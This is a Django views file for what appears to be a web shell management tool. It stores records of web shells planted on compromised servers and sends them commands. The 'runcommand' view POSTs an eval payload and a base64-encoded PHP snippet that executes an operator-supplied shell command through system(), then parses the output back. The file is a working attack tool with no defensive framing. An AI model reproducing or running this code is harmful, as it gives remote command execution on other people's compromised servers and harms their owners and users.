import base64
import json
import urllib
from django.http import HttpResponse
from django.shortcuts import render
from db.models import webshell

# Create your views here.
def command(request):
    id = request.GET.get('id')
    shell = webshell.objects.get(id=id)
    return render(request, 'cmd.html', {'id': id,'info':shell.information,'dir':shell.ponypath})

def runcommand(request):
    id = request.GET.get('id')
    cmd =  request.GET.get('cmd')
    dir = request.GET.get('dir')
    shell = webshell.objects.get(id=id)
    print(dir)
    if dir == None:
        dir = shell.ponypath
    data = {
        shell.passwd: "@eval(base64_decode($_POST[z0]));",
        'z0': """QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=""",
        'z1': 'Y21k',
        'z2': base64.urlsafe_b64encode(bytes("cd /d \"" + dir + "\"&" + cmd + "&echo [S]&cd&echo [E]", 'utf-8'))
    }
    data = urllib.parse.urlencode(data).encode('ascii')
    req = urllib.request.Request(shell.links, data)
    response = urllib.request.urlopen(req)
    compressedData = response.read()
    compressedData = compressedData.decode('utf-8', 'ignore')
    print(compressedData)
    cmd = compressedData.split('->|')[-1].split('[S]')[0].split('\n')
    path = compressedData.split('[S]')[-1].split('[E]')[0]
    return HttpResponse(json.dumps({'cmd': cmd,'path':path}))